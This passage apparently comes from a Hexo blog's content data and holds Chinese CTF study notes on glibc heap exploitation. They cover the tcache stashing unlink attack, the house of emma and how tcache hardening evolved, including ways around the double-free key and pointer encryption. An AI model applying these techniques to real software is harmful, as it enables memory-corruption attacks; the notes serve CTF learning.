class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>在emma的利用中,主要就是利用<code>_IO_cookie_read</code>,而在这个函数的开始几行,是对<code>rax</code> 加密,然后<code>call rax</code>,加密是另一个操作数是<code>fs:[0x30]</code>,这个指针可以利用<code>large bin attack</code> 修改.</p>\n<p>如果题目开启沙箱禁用了<code>execve</code>,那就需要<code>setcontext</code>中的<code>gadget</code>了</p>\n<h2 id=\"利用思路\"><a href=\"#利用思路\" class=\"headerlink\" title=\"利用思路\"></a>利用思路</h2><ol>\n<li>利用<code>largebins attack</code>等手段,修改掉<code>stderr</code>,然后伪造<code>fake io</code></li>\n<li>利用<code>setcontext+61</code>控制程序的执行流.</li>\n<li>如果程序没有开启沙箱的话,可以考虑用<code>system</code>来<code>get shell</code></li>\n</ol>\n<h2 id=\"例子\"><a href=\"#例子\" class=\"headerlink\" title=\"例子\"></a>例子</h2><p><a href=\"https://peruy.github.io/2025/10/06/ctf%E6%AF%94%E8%B5%9B%E5%A4%8D%E7%8E%B0/%E6%B9%96%E6%B9%98%E6%9D%AF-2021-house%20of%20emma/\">湖湘杯-2021-house of emma</a></p>\n"},{"title":"tcache_stashing_attack","cover":"/img/紫发.png","_content":"# tcache_stashing_attack\n\n## 前言\n\n>虽说已经准备考公了，但是自己还是喜欢打pwn ， 感觉还是不能放弃。\n>那就继续前进\n\n## 原理\n\n```c\nwhile ( tcache->counts[tc_idx] < mp_.tcache_count\n    && (tc_victim = last (bin) ) != bin) //验证取出的Chunk是否为Bin本身（Smallbin是否已空）\n{\n if (tc_victim != 0) //成功获取了chunk\n {\n     bck = tc_victim->bk; //在这里bck是fake chunk的bk\n     //设置标志位\n     set_inuse_bit_at_offset (tc_victim, nb);\n     if (av != &main_arena)\n         set_non_main_arena (tc_victim);\n \n     bin->bk = bck;\n     bck->fd = bin; //关键处\n \n     tcache_put (tc_victim, tc_idx); //将其放入到tcache中\n }\n}\n```\n\n\n还是先看源码吧,这个触发条件就是,tcache bins 里有堆块,但是 没有从tachce 申请, 那么就会触发这段代码.\n\n触发之后,它会把当前`smallbin`中的堆块全都放进`tcache bins`,同时还不会检查 bk.\n\n那么如果我修改`small bin` 中最后的堆块的`bk` 为一个 `fake chunk`, 并且将`fake chunk` 的 `bk` 指针修改为 `target - 0x10`, 那么经过上面的代码,就会在`target`处写入这个 `small bin`的地址.\n\n而且之后,`fake chunk` 会进入到`tcache bin` ,可以直接申请出来.\n\n通过这个方法,可以做两件事情,一是往一个地址里写入`small bins` 的地址,一个是可以申请一块`fake chunk` \n\n在unsorted 失效之后,这个方法,使用的更为广泛.\n\n## 流程\n\n介绍完了,原理之后,我们来看具体的一个利用流程.具体该如何操作呢?\n\n\n\n1. 先把`tcache bins` 填充 到有5个堆块, 然后相应大小的`small bin`中有2个堆块.\n>`tcache bin`的填充,不多说.`small bin`,可以通过切割`unsorted bin` 控制里面的大小,然后再申请大堆块,迫使其放入`tcache bin`\n\n\n2. 假设small bin中的结构如下:\n>chunk A: fd=main_arena+88 , bk=B\n>chunk B: fd=A,bk=main_arena+88\n>那么,接下来如果使用calloc 申请 ,会先申请出A堆块,然后对B做上述处理.\n\n\n3. 那么,我们提前修改,B中的bk为fake chunk 的地址,同时确保,这个fd可写.\n>chunk B: fd=A,bk=fake chunk\n>fake chunk:fd=随便 bk=target-0x10\n>这个target 要可写\n\n\n4. 那么,在之后calloc ,会对这两个堆块都走上述代码.\n>申请时,A被申请出去,此时smallbin fd 链只有 B,bk 链里有fake chunk 和它的bk.\n>因为代码里是取last(),也就是从bk 链里取,所以先出理b.那么就有 fake chunk->fd=B\n>然后处理fake chunk, 所以有target=fake chunk\n\n","source":"_posts/heap/tcache_stashing_attack.md","raw":"---\ntitle: tcache_stashing_attack\ntags:\n    - 堆利用\n    - tcache \ncategories:\n    - 学习笔记\ncover: /img/紫发.png\n---\n# tcache_stashing_attack\n\n## 前言\n\n>虽说已经准备考公了，但是自己还是喜欢打pwn ， 感觉还是不能放弃。\n>那就继续前进\n\n## 原理\n\n```c\nwhile ( tcache->counts[tc_idx] < mp_.tcache_count\n    && (tc_victim = last (bin) ) != bin) //验证取出的Chunk是否为Bin本身（Smallbin是否已空）\n{\n if (tc_victim != 0) //成功获取了chunk\n {\n     bck = tc_victim->bk; //在这里bck是fake chunk的bk\n     //设置标志位\n     set_inuse_bit_at_offset (tc_victim, nb);\n     if (av != &main_arena)\n         set_non_main_arena (tc_victim);\n \n     bin->bk = bck;\n     bck->fd = bin; //关键处\n \n     tcache_put (tc_victim, tc_idx); //将其放入到tcache中\n }\n}\n```\n\n\n还是先看源码吧,这个触发条件就是,tcache bins 里有堆块,但是 没有从tachce 申请, 那么就会触发这段代码.\n\n触发之后,它会把当前`smallbin`中的堆块全都放进`tcache bins`,同时还不会检查 bk.\n\n那么如果我修改`small bin` 中最后的堆块的`bk` 为一个 `fake chunk`, 并且将`fake chunk` 的 `bk` 指针修改为 `target - 0x10`, 那么经过上面的代码,就会在`target`处写入这个 `small bin`的地址.\n\n而且之后,`fake chunk` 会进入到`tcache bin` ,可以直接申请出来.\n\n通过这个方法,可以做两件事情,一是往一个地址里写入`small bins` 的地址,一个是可以申请一块`fake chunk` \n\n在unsorted 失效之后,这个方法,使用的更为广泛.\n\n## 流程\n\n介绍完了,原理之后,我们来看具体的一个利用流程.具体该如何操作呢?\n\n\n\n1. 先把`tcache bins` 填充 到有5个堆块, 然后相应大小的`small bin`中有2个堆块.\n>`tcache bin`的填充,不多说.`small bin`,可以通过切割`unsorted bin` 控制里面的大小,然后再申请大堆块,迫使其放入`tcache bin`\n\n\n2. 假设small bin中的结构如下:\n>chunk A: fd=main_arena+88 , bk=B\n>chunk B: fd=A,bk=main_arena+88\n>那么,接下来如果使用calloc 申请 ,会先申请出A堆块,然后对B做上述处理.\n\n\n3. 那么,我们提前修改,B中的bk为fake chunk 的地址,同时确保,这个fd可写.\n>chunk B: fd=A,bk=fake chunk\n>fake chunk:fd=随便 bk=target-0x10\n>这个target 要可写\n\n\n4. 那么,在之后calloc ,会对这两个堆块都走上述代码.\n>申请时,A被申请出去,此时smallbin fd 链只有 B,bk 链里有fake chunk 和它的bk.\n>因为代码里是取last(),也就是从bk 链里取,所以先出理b.那么就有 fake chunk->fd=B\n>然后处理fake chunk, 所以有target=fake chunk\n\n","slug":"heap/tcache_stashing_attack","published":1,"date":"2025-10-06T14:59:33.577Z","updated":"2025-10-06T15:02:55.753Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2if0020uomyhih9hhft","content":"<h1 id=\"tcache-stashing-attack\"><a href=\"#tcache-stashing-attack\" class=\"headerlink\" title=\"tcache_stashing_attack\"></a>tcache_stashing_attack</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>虽说已经准备考公了，但是自己还是喜欢打pwn ， 感觉还是不能放弃。<br>那就继续前进</p>\n</blockquote>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class=\"line\">    &amp;&amp; (tc_victim = last (bin) ) != bin) <span class=\"comment\">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (tc_victim != <span class=\"number\">0</span>) <span class=\"comment\">//成功获取了chunk</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">     bck = tc_victim-&gt;bk; <span class=\"comment\">//在这里bck是fake chunk的bk</span></span><br><span class=\"line\">     <span class=\"comment\">//设置标志位</span></span><br><span class=\"line\">     set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">         set_non_main_arena (tc_victim);</span><br><span class=\"line\"> </span><br><span class=\"line\">     bin-&gt;bk = bck;</span><br><span class=\"line\">     bck-&gt;fd = bin; <span class=\"comment\">//关键处</span></span><br><span class=\"line\"> </span><br><span class=\"line\">     tcache_put (tc_victim, tc_idx); <span class=\"comment\">//将其放入到tcache中</span></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<p>还是先看源码吧,这个触发条件就是,tcache bins 里有堆块,但是 没有从tachce 申请, 那么就会触发这段代码.</p>\n<p>触发之后,它会把当前<code>smallbin</code>中的堆块全都放进<code>tcache bins</code>,同时还不会检查 bk.</p>\n<p>那么如果我修改<code>small bin</code> 中最后的堆块的<code>bk</code> 为一个 <code>fake chunk</code>, 并且将<code>fake chunk</code> 的 <code>bk</code> 指针修改为 <code>target - 0x10</code>, 那么经过上面的代码,就会在<code>target</code>处写入这个 <code>small bin</code>的地址.</p>\n<p>而且之后,<code>fake chunk</code> 会进入到<code>tcache bin</code> ,可以直接申请出来.</p>\n<p>通过这个方法,可以做两件事情,一是往一个地址里写入<code>small bins</code> 的地址,一个是可以申请一块<code>fake chunk</code> </p>\n<p>在unsorted 失效之后,这个方法,使用的更为广泛.</p>\n<h2 id=\"流程\"><a href=\"#流程\" class=\"headerlink\" title=\"流程\"></a>流程</h2><p>介绍完了,原理之后,我们来看具体的一个利用流程.具体该如何操作呢?</p>\n<ol>\n<li><p>先把<code>tcache bins</code> 填充 到有5个堆块, 然后相应大小的<code>small bin</code>中有2个堆块.</p>\n<blockquote>\n<p><code>tcache bin</code>的填充,不多说.<code>small bin</code>,可以通过切割<code>unsorted bin</code> 控制里面的大小,然后再申请大堆块,迫使其放入<code>tcache bin</code></p>\n</blockquote>\n</li>\n<li><p>假设small bin中的结构如下:</p>\n<blockquote>\n<p>chunk A: fd&#x3D;main_arena+88 , bk&#x3D;B<br>chunk B: fd&#x3D;A,bk&#x3D;main_arena+88<br>那么,接下来如果使用calloc 申请 ,会先申请出A堆块,然后对B做上述处理.</p>\n</blockquote>\n</li>\n<li><p>那么,我们提前修改,B中的bk为fake chunk 的地址,同时确保,这个fd可写.</p>\n<blockquote>\n<p>chunk B: fd&#x3D;A,bk&#x3D;fake chunk<br>fake chunk:fd&#x3D;随便 bk&#x3D;target-0x10<br>这个target 要可写</p>\n</blockquote>\n</li>\n<li><p>那么,在之后calloc ,会对这两个堆块都走上述代码.</p>\n<blockquote>\n<p>申请时,A被申请出去,此时smallbin fd 链只有 B,bk 链里有fake chunk 和它的bk.<br>因为代码里是取last(),也就是从bk 链里取,所以先出理b.那么就有 fake chunk-&gt;fd&#x3D;B<br>然后处理fake chunk, 所以有target&#x3D;fake chunk</p>\n</blockquote>\n</li>\n</ol>\n","excerpt":"","more":"<h1 id=\"tcache-stashing-attack\"><a href=\"#tcache-stashing-attack\" class=\"headerlink\" title=\"tcache_stashing_attack\"></a>tcache_stashing_attack</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><blockquote>\n<p>虽说已经准备考公了，但是自己还是喜欢打pwn ， 感觉还是不能放弃。<br>那就继续前进</p>\n</blockquote>\n<h2 id=\"原理\"><a href=\"#原理\" class=\"headerlink\" title=\"原理\"></a>原理</h2><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">while</span> ( tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class=\"line\">    &amp;&amp; (tc_victim = last (bin) ) != bin) <span class=\"comment\">//验证取出的Chunk是否为Bin本身（Smallbin是否已空）</span></span><br><span class=\"line\">&#123;</span><br><span class=\"line\"> <span class=\"keyword\">if</span> (tc_victim != <span class=\"number\">0</span>) <span class=\"comment\">//成功获取了chunk</span></span><br><span class=\"line\"> &#123;</span><br><span class=\"line\">     bck = tc_victim-&gt;bk; <span class=\"comment\">//在这里bck是fake chunk的bk</span></span><br><span class=\"line\">     <span class=\"comment\">//设置标志位</span></span><br><span class=\"line\">     set_inuse_bit_at_offset (tc_victim, nb);</span><br><span class=\"line\">     <span class=\"keyword\">if</span> (av != &amp;main_arena)</span><br><span class=\"line\">         set_non_main_arena (tc_victim);</span><br><span class=\"line\"> </span><br><span class=\"line\">     bin-&gt;bk = bck;</span><br><span class=\"line\">     bck-&gt;fd = bin; <span class=\"comment\">//关键处</span></span><br><span class=\"line\"> </span><br><span class=\"line\">     tcache_put (tc_victim, tc_idx); <span class=\"comment\">//将其放入到tcache中</span></span><br><span class=\"line\"> &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n\n<p>还是先看源码吧,这个触发条件就是,tcache bins 里有堆块,但是 没有从tachce 申请, 那么就会触发这段代码.</p>\n<p>触发之后,它会把当前<code>smallbin</code>中的堆块全都放进<code>tcache bins</code>,同时还不会检查 bk.</p>\n<p>那么如果我修改<code>small bin</code> 中最后的堆块的<code>bk</code> 为一个 <code>fake chunk</code>, 并且将<code>fake chunk</code> 的 <code>bk</code> 指针修改为 <code>target - 0x10</code>, 那么经过上面的代码,就会在<code>target</code>处写入这个 <code>small bin</code>的地址.</p>\n<p>而且之后,<code>fake chunk</code> 会进入到<code>tcache bin</code> ,可以直接申请出来.</p>\n<p>通过这个方法,可以做两件事情,一是往一个地址里写入<code>small bins</code> 的地址,一个是可以申请一块<code>fake chunk</code> </p>\n<p>在unsorted 失效之后,这个方法,使用的更为广泛.</p>\n<h2 id=\"流程\"><a href=\"#流程\" class=\"headerlink\" title=\"流程\"></a>流程</h2><p>介绍完了,原理之后,我们来看具体的一个利用流程.具体该如何操作呢?</p>\n<ol>\n<li><p>先把<code>tcache bins</code> 填充 到有5个堆块, 然后相应大小的<code>small bin</code>中有2个堆块.</p>\n<blockquote>\n<p><code>tcache bin</code>的填充,不多说.<code>small bin</code>,可以通过切割<code>unsorted bin</code> 控制里面的大小,然后再申请大堆块,迫使其放入<code>tcache bin</code></p>\n</blockquote>\n</li>\n<li><p>假设small bin中的结构如下:</p>\n<blockquote>\n<p>chunk A: fd&#x3D;main_arena+88 , bk&#x3D;B<br>chunk B: fd&#x3D;A,bk&#x3D;main_arena+88<br>那么,接下来如果使用calloc 申请 ,会先申请出A堆块,然后对B做上述处理.</p>\n</blockquote>\n</li>\n<li><p>那么,我们提前修改,B中的bk为fake chunk 的地址,同时确保,这个fd可写.</p>\n<blockquote>\n<p>chunk B: fd&#x3D;A,bk&#x3D;fake chunk<br>fake chunk:fd&#x3D;随便 bk&#x3D;target-0x10<br>这个target 要可写</p>\n</blockquote>\n</li>\n<li><p>那么,在之后calloc ,会对这两个堆块都走上述代码.</p>\n<blockquote>\n<p>申请时,A被申请出去,此时smallbin fd 链只有 B,bk 链里有fake chunk 和它的bk.<br>因为代码里是取last(),也就是从bk 链里取,所以先出理b.那么就有 fake chunk-&gt;fd&#x3D;B<br>然后处理fake chunk, 所以有target&#x3D;fake chunk</p>\n</blockquote>\n</li>\n</ol>\n"},{"title":"tcache的发展历程","cover":"/img/紫发.png","_content":"# tcache的发展历程\n\n## 前言\n\n经建议，笔者打算参加一次xctf 的分站赛，为此开始备注。遂开始复现往届比赛赛题。先从这次sekaictf-2025开始。这是从第一题开始的分析与延伸。\n\n## tcache的引入及更新\n\n### 2.26-2.27\n首先，tcache 在glibc 2.26 版本登场，其目的是为了加快堆块的管理。因此在没有作安全的检测，也为之后的利用埋下了隐患。\n#### 相关源码\n```c\n#define TCACHE_MAX_BINS 64\ntypedef struct tcache_perthread_struct {\n    char          counts[TCACHE_MAX_BINS];   /* 0x00 */\n    tcache_entry *entries[TCACHE_MAX_BINS];  /* 0x40 */\n} tcache_perthread_struct;                   /* 总长 0x290 */\n\ntypedef struct tcache_entry {\n    struct tcache_entry *next;   /* 仅 8 字节 */\n} tcache_entry;\n```\n\n在glibc2.26 和 glibc2.27 的版本中，没有任何安全检测的手段。可以修改tcache chunk(指链入tache bins 中的堆块) 的next 字段，完成任意地址分配。\n\n当然，为了便于tcache 的管理，加入了`tcache_perthread_struct` 结构体.\n`counts` 数组,用来记录每个大小的`tcache bins` 中的数量\n`entries`数组用来记录每个`tcache chunk`的`next`字段的地址\n同理,我们可以修改`counts` 和`entries`来欺骗系统,完成任意地址分配.\n\n因为没有任何检测,所以我们可以完成`double free`,甚至你可以把同一个堆块连续free 7次,把tcache bins 填满.\n\n### 2.28 第一次补丁\n\n显然,注意到了`double free`的利用过于easy, 于是`tcache` 迎来了他的第一次更新, 添加了 key 这个变量. 在2.29 版本没有什么改动\n#### 相关源码\n```c\ntypedef struct tcache_entry {\n    struct tcache_entry *next;\n    struct tcache_perthread_struct *key;   /* ← 指向 tcache 本身 */\n} tcache_entry;\n\n\nstatic void\ntcache_put (tcache_perthread_struct *tcache, tcache_entry *e, size_t tc_idx)\n{\n    /* 1. 先检查链表长度 */\n    if (tcache->counts[tc_idx] >= TCACHE_MAX_BINS)\n        return;\n\n    /* 2. 关键：double-free 检测 */\n    if (__glibc_unlikely (e->key == tcache))\n        malloc_printerr (\"double free or corruption (fasttop)\");\n\n    /* 3. 把 chunk 插入链表头 */\n    e->key = tcache;                  // 标记“我已进 tcache”\n    e->next = tcache->entries[tc_idx];\n    tcache->entries[tc_idx] = e;\n    tcache->counts[tc_idx]++;\n}\n```\n\n简单解析一下:\n1. key字段开始不作设置\n2. 当堆块通过 `double-free`时,也就是`e->key!=tcache`时,`e`进入`tcache bins`中,并把`key`设置为`tcahche`\n3. 那么下次`free(e)`,就会检测到这个的key,从而判断是否`double-free`.\n\n但是,想要绕过也非常简单.想要继续`double free`,只要能修改到key字段就可以继续这个利用.\n而修改next的方法可以照旧.\n\n这个检测,仅仅是为了针对`double free`而已,所以局限很大.对安全方面的加强有点,但多.\n\n### 2.30微调-counts加宽\n\n没有大改,也不知道为啥要这么改动.效果不知道,目的不知道. \n\n```c\n#define TCACHE_MAX_BINS 64\ntypedef struct tcache_perthread_struct {\n    uint16_t          counts[TCACHE_MAX_BINS];   /* 0x00 */\n    tcache_entry *entries[TCACHE_MAX_BINS];  /* 0x80 */\n} tcache_perthread_struct;   \n```\n\n在2.26 和 2.27 中, 这个字段是char 类型,也就是只有8位, 1字节.   现在加宽, 改为16位, 2字节.\n以后修改 entries 数组时,需要把偏移调整一下.\n\n### 2.32小加强-entries加密\n\nentries的加密,让之前直接修改next 的利用变得稍微困难了一点. 我们必须明确一个点,tcache bins 中, chunk 的 下一个堆块 原本是有next 决定的,因为entries 就是 直接 用next的值. \n但是现在不是了, entries 是 (&next>>12) ^ next . 但是因为加密的算法是固定的,所以 我们只要能泄露堆地址,就可以继续伪造.\n\n#### 相关源码\n```c\n#define PROTECT_PTR(pos, ptr) \\\n        ((__typeof (ptr)) (((size_t) pos >> 12) ^ (size_t) (ptr)))\n```\n\n假设 你要写入的 地址是 target , 你现在修改的chunk 的 next 指针的地址是addr. 那么你实际需要写入next 的值是 (addr>>12) ^ target. \n\n计算同样非常简单.\n\n### 2.34小加强-key随机化\n\n```c\nstatic __thread tcache_perthread_struct *tcache = NULL;\nstatic __thread size_t tcache_key = 0;   /* ← 不再是 tcache 地址，而是随机值 */\n```\n\n虽然是小加强, 因为此时要获取key似乎只能爆破.但是我不明白,因为对key字段的检测,只有在这个堆块被free 要进入tcache bins 时.\n\n也就是说,其实很多时候根本触发不了这个检测.\n\n## 利用手法\n\n###  参考文章\n[[原创]tcache bin利用总结-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-275302.htm#msg_header_h2_4)\n\n","source":"_posts/heap/tcache的发展历程.md","raw":"---\ntitle: tcache的发展历程\ntags:\n    - 堆利用\n    - tcache \ncategories:\n    - 学习笔记\ncover: /img/紫发.png\n---\n# tcache的发展历程\n\n## 前言\n\n经建议，笔者打算参加一次xctf 的分站赛，为此开始备注。遂开始复现往届比赛赛题。先从这次sekaictf-2025开始。这是从第一题开始的分析与延伸。\n\n## tcache的引入及更新\n\n### 2.26-2.27\n首先，tcache 在glibc 2.26 版本登场，其目的是为了加快堆块的管理。因此在没有作安全的检测，也为之后的利用埋下了隐患。\n#### 相关源码\n```c\n#define TCACHE_MAX_BINS 64\ntypedef struct tcache_perthread_struct {\n    char          counts[TCACHE_MAX_BINS];   /* 0x00 */\n    tcache_entry *entries[TCACHE_MAX_BINS];  /* 0x40 */\n} tcache_perthread_struct;                   /* 总长 0x290 */\n\ntypedef struct tcache_entry {\n    struct tcache_entry *next;   /* 仅 8 字节 */\n} tcache_entry;\n```\n\n在glibc2.26 和 glibc2.27 的版本中，没有任何安全检测的手段。可以修改tcache chunk(指链入tache bins 中的堆块) 的next 字段，完成任意地址分配。\n\n当然，为了便于tcache 的管理，加入了`tcache_perthread_struct` 结构体.\n`counts` 数组,用来记录每个大小的`tcache bins` 中的数量\n`entries`数组用来记录每个`tcache chunk`的`next`字段的地址\n同理,我们可以修改`counts` 和`entries`来欺骗系统,完成任意地址分配.\n\n因为没有任何检测,所以我们可以完成`double free`,甚至你可以把同一个堆块连续free 7次,把tcache bins 填满.\n\n### 2.28 第一次补丁\n\n显然,注意到了`double free`的利用过于easy, 于是`tcache` 迎来了他的第一次更新, 添加了 key 这个变量. 在2.29 版本没有什么改动\n#### 相关源码\n```c\ntypedef struct tcache_entry {\n    struct tcache_entry *next;\n    struct tcache_perthread_struct *key;   /* ← 指向 tcache 本身 */\n} tcache_entry;\n\n\nstatic void\ntcache_put (tcache_perthread_struct *tcache, tcache_entry *e, size_t tc_idx)\n{\n    /* 1. 先检查链表长度 */\n    if (tcache->counts[tc_idx] >= TCACHE_MAX_BINS)\n        return;\n\n    /* 2. 关键：double-free 检测 */\n    if (__glibc_unlikely (e->key == tcache))\n        malloc_printerr (\"double free or corruption (fasttop)\");\n\n    /* 3. 把 chunk 插入链表头 */\n    e->key = tcache;                  // 标记“我已进 tcache”\n    e->next = tcache->entries[tc_idx];\n    tcache->entries[tc_idx] = e;\n    tcache->counts[tc_idx]++;\n}\n```\n\n简单解析一下:\n1. key字段开始不作设置\n2. 当堆块通过 `double-free`时,也就是`e->key!=tcache`时,`e`进入`tcache bins`中,并把`key`设置为`tcahche`\n3. 那么下次`free(e)`,就会检测到这个的key,从而判断是否`double-free`.\n\n但是,想要绕过也非常简单.想要继续`double free`,只要能修改到key字段就可以继续这个利用.\n而修改next的方法可以照旧.\n\n这个检测,仅仅是为了针对`double free`而已,所以局限很大.对安全方面的加强有点,但多.\n\n### 2.30微调-counts加宽\n\n没有大改,也不知道为啥要这么改动.效果不知道,目的不知道. \n\n```c\n#define TCACHE_MAX_BINS 64\ntypedef struct tcache_perthread_struct {\n    uint16_t          counts[TCACHE_MAX_BINS];   /* 0x00 */\n    tcache_entry *entries[TCACHE_MAX_BINS];  /* 0x80 */\n} tcache_perthread_struct;   \n```\n\n在2.26 和 2.27 中, 这个字段是char 类型,也就是只有8位, 1字节.   现在加宽, 改为16位, 2字节.\n以后修改 entries 数组时,需要把偏移调整一下.\n\n### 2.32小加强-entries加密\n\nentries的加密,让之前直接修改next 的利用变得稍微困难了一点. 我们必须明确一个点,tcache bins 中, chunk 的 下一个堆块 原本是有next 决定的,因为entries 就是 直接 用next的值. \n但是现在不是了, entries 是 (&next>>12) ^ next . 但是因为加密的算法是固定的,所以 我们只要能泄露堆地址,就可以继续伪造.\n\n#### 相关源码\n```c\n#define PROTECT_PTR(pos, ptr) \\\n        ((__typeof (ptr)) (((size_t) pos >> 12) ^ (size_t) (ptr)))\n```\n\n假设 你要写入的 地址是 target , 你现在修改的chunk 的 next 指针的地址是addr. 那么你实际需要写入next 的值是 (addr>>12) ^ target. \n\n计算同样非常简单.\n\n### 2.34小加强-key随机化\n\n```c\nstatic __thread tcache_perthread_struct *tcache = NULL;\nstatic __thread size_t tcache_key = 0;   /* ← 不再是 tcache 地址，而是随机值 */\n```\n\n虽然是小加强, 因为此时要获取key似乎只能爆破.但是我不明白,因为对key字段的检测,只有在这个堆块被free 要进入tcache bins 时.\n\n也就是说,其实很多时候根本触发不了这个检测.\n\n## 利用手法\n\n###  参考文章\n[[原创]tcache bin利用总结-Pwn-看雪-安全社区|安全招聘|kanxue.com](https://bbs.kanxue.com/thread-275302.htm#msg_header_h2_4)\n\n","slug":"heap/tcache的发展历程","published":1,"date":"2025-10-06T14:58:00.046Z","updated":"2025-10-06T15:02:58.797Z","comments":1,"layout":"post","photos":[],"_id":"cmglxf2if0023uomyc07k8k7s","content":"<h1 id=\"tcache的发展历程\"><a href=\"#tcache的发展历程\" class=\"headerlink\" title=\"tcache的发展历程\"></a>tcache的发展历程</h1><h2 id=\"前言\"><a href=\"#前言\" class=\"headerlink\" title=\"前言\"></a>前言</h2><p>经建议，笔者打算参加一次xctf 的分站赛，为此开始备注。遂开始复现往届比赛赛题。先从这次sekaictf-2025开始。这是从第一题开始的分析与延伸。</p>\n<h2 id=\"tcache的引入及更新\"><a href=\"#tcache的引入及更新\" class=\"headerlink\" title=\"tcache的引入及更新\"></a>tcache的引入及更新</h2><h3 id=\"2-26-2-27\"><a href=\"#2-26-2-27\" class=\"headerlink\" title=\"2.26-2.27\"></a>2.26-2.27</h3><p>首先，tcache 在glibc 2.26 版本登场，其目的是为了加快堆块的管理。因此在没有作安全的检测，也为之后的利用埋下了隐患。</p>\n<h4 id=\"相关源码\"><a href=\"#相关源码\" class=\"headerlink\" title=\"相关源码\"></a>相关源码</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">#<span class=\"keyword\">define</span> TCACHE_MAX_BINS 64</span></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_perthread_struct</span> &#123;</span></span><br><span class=\"line\">    <span class=\"type\">char</span>          counts[TCACHE_MAX_BINS];   <span class=\"comment\">/* 0x00 */</span></span><br><span class=\"line\">    tcache_entry *entries[TCACHE_MAX_BINS];  <span class=\"comment\">/* 0x40 */</span></span><br><span class=\"line\">&#125; tcache_perthread_struct;                   <span class=\"comment\">/* 总长 0x290 */</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">typedef</span> <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_entry</span> &#123;</span></span><br><span class=\"line\">    <span class=\"class\"><span class=\"keyword\">struct</span> <span class=\"title\">tcache_entry</span> *<span class=\"title\">next</span>;</span>   <span class=\"comment\">/* 仅 8 字节 */</span></span><br><span class=\"line\">&#125; tcache_entry;</span><br></pre></td></tr></table></figure>\n\n<p>在glibc2.26 和 glibc2.27 的版本中，没有任何安全检测的手段。可以修改tcache chunk(指链入tache bins 中的堆块) 的next 字段，完成任意地址分配。</p>\n<p>当然，为了便于tcache 的管理，加入了<code>tcache_perthread_struct</code> 结构体.<br><code>counts</code> 数组,用来记录每个大小的<code>tcache bins</code> 中的数量<br><code>entries</code>数组用来记录每个<code>tcache chunk</code>的<code>next</code>字段的地址<br>同理,我们可以修改<code>counts</code> 和<code>entries</code>来欺骗系统,完成任意地址分配.</p>\n<p>因为没有任何检测,所以我们可以完成<code>double free</code>,甚至你可以把同一个堆块连续free 7次,把tcache bins 填满.</p>\n<h3 id=\"2-28-第一次补丁\"><a href=\"#2-28-第一次补丁\" class=\"headerlink\" title=\"2.28 第一次补丁\"></a>2.28 第一次补丁</h3><p>显然,注意到了<code>double free</code>的利用过于easy, 于是<code>tcache</code> 迎来了他的第一次更新, 添加了 key 这个变量. 在2.29 版本没有什么改动</p>\n<h4 id=\"相关源码-1\"><a href=\"#相关源码-1\" class=\"headerlink\" title=\"相关源码\"></a>相关源码</h4><figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">typedef</span> <span 